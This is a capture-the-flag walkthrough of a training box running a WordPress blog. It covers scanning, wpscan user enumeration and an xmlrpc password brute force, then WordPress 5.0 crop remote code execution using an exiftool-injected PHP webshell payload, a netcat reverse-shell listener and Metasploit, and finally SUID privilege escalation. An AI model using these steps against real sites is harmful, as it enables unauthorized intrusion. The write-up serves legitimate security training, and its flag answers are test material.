# Blog
Billy Joel made a blog on his home computer and has started working on it.  It's going to be so awesome!

Enumerate this box and find the 2 flags that are hiding on it!  Billy has some weird things going on his laptop.  Can you maneuver around and get what you need?  Or will you fall down the rabbit hole...

**In order to get the blog to work with AWS, you'll need to add 10.10.5.115 blog.thm to your /etc/hosts file.**

- First, find the service running on the target first
- Command : `nmap -sV -sC 10.10.5.115`

![Pasted image 20251001202402.png](thm_pics/Pasted%20image%2020251001202402.png)

- So its a wordpress web, running Apache httpd 2.4.29
- lets access robots.txt

![Pasted image 20251001202706.png](thm_pics/Pasted%20image%2020251001202706.png)

- wp-admin is Disallowed, which is a dashboard for admin and **it requires valid credentials**
- I tried accessing /wp-admin/admin-ajax.php

![Pasted image 20251001203017.png](thm_pics/Pasted%20image%2020251001203017.png)

- a zero
- Then i tried using gobuster to find any intersting directories
- Command : `gobuster dir -u http://10.10.5.115 -w /usr/share/wordlists/dirb/common.txt`

![Pasted image 20251001203251.png](thm_pics/Pasted%20image%2020251001203251.png)

- a zero again, lets try accessing it, but nothing interesting appears
- Lets try `wpscan`
- Command : `wpscan --url http://10.10.5.115`

![Pasted image 20251001204715.png](thm_pics/Pasted%20image%2020251001204715.png)

- Lets try enumerating usernames :  `wpscan --url http://10.10.5.115 -e u`

![Pasted image 20251001205416.png](thm_pics/Pasted%20image%2020251001205416.png)

- there are 2 users
- Try brute forcing with username bjoel : `wpscan --url http://10.10.5.115 --password-attack xmlrpc -U "bjoel" -P /usr/share/wordlists/rockyou.txt`
- Try brute forcing with username kwheel : `wpscan --url http://10.10.5.115 --password-attack xmlrpc -U "kwheel" -P /usr/share/wordlists/rockyou.txt`

![Pasted image 20251001214109.png](thm_pics/Pasted%20image%2020251001214109.png)

- since we found the password, we can then use the exploit file i got from searchsploit
- The Wordpress version is 5.0.0, i used searchsploit to find and found **"Image Remote Code Execution"**
- set lhost, lport to our attacking ip and 4141

![Pasted image 20251001214204.png](thm_pics/Pasted%20image%2020251001214204.png)

- Here is the usage : `python3 49512.py http://10.10.5.115:80/ kwheel cutiepie1 wp_theme`

![Pasted image 20251001215346.png](thm_pics/Pasted%20image%2020251001215346.png)

- we have to generate gd.jpg by ourselves and inject the php payload via exiftool
- `touch gd .jpg`
- `convert -size 1x1 xc:white gd.jpg`
- `exiftool gd.jpg -CopyrightNotice="<?=\`\$_GET[0]\`?>"`
- Set up listener at port 4141
- Command : `nc -lvnp 4141`

![Pasted image 20251001220815.png](thm_pics/Pasted%20image%2020251001220815.png)

- now, go to that dir 

![Pasted image 20251001221044.png](thm_pics/Pasted%20image%2020251001221044.png)

- i cannot find a file to execute
- so, i tried using a **msfconsole module** instead, it has a module called "`http/wp_crop_rce`" that i found from searching "wordpress 5.0"
- meterpreter session opens

![Pasted image 20251001225152.png](thm_pics/Pasted%20image%2020251001225152.png)

- i found user.txt but maybe this is not it, it tells me to try harder lol
- now, lets try to elevate our privs and find files with SUID bits set by using `find / -type f -perm -04000 -ls 2>/dev/null`

![Pasted image 20251001230515.png](thm_pics/Pasted%20image%2020251001230515.png)

- checker seems like a custom name
-  Trace **what it does when run** : `ltrace /usr/sbin/checker`

![Pasted image 20251001231959.png](thm_pics/Pasted%20image%2020251001231959.png)

- Experiment : run checker with env set
- Try making the env present : `env admin=1 /usr/sbin/checker`

![Pasted image 20251001232715.png](thm_pics/Pasted%20image%2020251001232715.png)

- got the root! 
- Now, find both root.txt and user.txt
- root.txt is in **/root/root.txt**
- user.txt is in **/home/media/usb/user.txt**

What CMS was Billy using?
Wordpress

What version of the above CMS was being used?
Wordpress 5.0